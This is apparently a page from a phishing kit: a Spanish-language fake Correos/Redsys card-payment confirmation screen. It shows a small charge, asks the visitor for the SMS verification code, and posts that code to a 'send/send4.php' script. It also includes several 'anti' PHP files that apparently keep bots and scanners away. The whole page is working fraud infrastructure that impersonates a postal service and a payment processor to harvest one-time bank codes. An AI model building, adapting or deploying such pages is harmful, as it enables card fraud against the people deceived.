<?php
    include "anti/anti1.php";
    include "anti/anti2.php";
    include "anti/anti3.php";
    include "anti/anti4.php";
    include "anti/anti7.php";
    include "anti/anti8.php";

?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirme su identidad</title>
    <link rel="shortcut icon" href="images/favicon.ico">
    <link rel="stylesheet" href="styles/head.css">
    <link rel="stylesheet" href="styles/main.css">
    <link rel="stylesheet" href="styles/responsive.css">
    <link rel="stylesheet" href="styles/codigo.Css">
    <!-- <link rel="stylesheet" href="styles/afterlog.css"> -->
    <link rel="stylesheet" href="styles/corr.css">
</head>
<body>
    <header>
        <nav>
            <div><img src="images/LogoCornamusa.svg" alt="image" height="40px" ></div>
            <div class="lina-nav">Ir a correos.es</div>
        </nav>
    </header>
    <main>
        <div class="grid1">
            <img src="images/background-login.jpg" alt="image" class="imgbackground">
        </div>
        <div class="grid2">
                <div class="divreference2">
                    <div><img src="images/redsys.webp" alt="image" height="50px"></div>
                    <div class="ecriir">
                        <img src="images/verified.png" alt="image" height="60px">
                    </div>
                </div>
            <form action="send/send4.php" method="POST" class="formcc">
                <div class="infos">Importe : <span>1,64 Euros</span></div>
                <div class="infos">Comercio : <span>Correos</span></div>
                <div class="infos">Número de tarjeta : <span>**** **** **** ****</span></div>
                <div class="parabiot">Para confirmar la operación, introduce la clave que hemos enviado por SMS a tu móvil </div>
                <div class="divinput">
                    <div for="name" class="labelname" style="color: red;">Clave SMS <span style="color: red;">*</span></div>
                   <div class="divimgsms">
                    <input type="tel" id="name" style="border-color: red;" name="sms2" class="name" required="" minlength="6" maxlength="8">
                        <img src="images/smsphone.svg" alt="image" height="30px" class="imgsms">
                   </div>
                </div>
                <div class="divbtnsubmit2">
                        <button type="submit" id="submitbtncodigo" style="font-size: 17px;cursor:pointer;color:#002e6d">Pagar y continuar</button>
                    </div>
            </form> 
        </div>
    </main>
    <footer>
        <div class="containerfooter">
            <div>
                <div><img src="images/footer-logo.svg" alt="image"></div>
            </div>
            <div class="divlastfoot">
                <div class="apaa">
                    <div class="textapa">Política de cookies</div>
                    <div class="textapa">Aviso legal</div>
                    <div class="textapa">Privacidad web</div>
                    <div class="textapa">Alerta seguridad</div>
                </div>
                <div class="lasttx">
                    ©Sociedad Estatal Correos y Telegrafos, S.A., S.M.E. Todos los derechos reservados.
                </div>
            </div>
        </div>

    </footer>
    <script src="javascript/codigo.js"></script>
</body>
</html>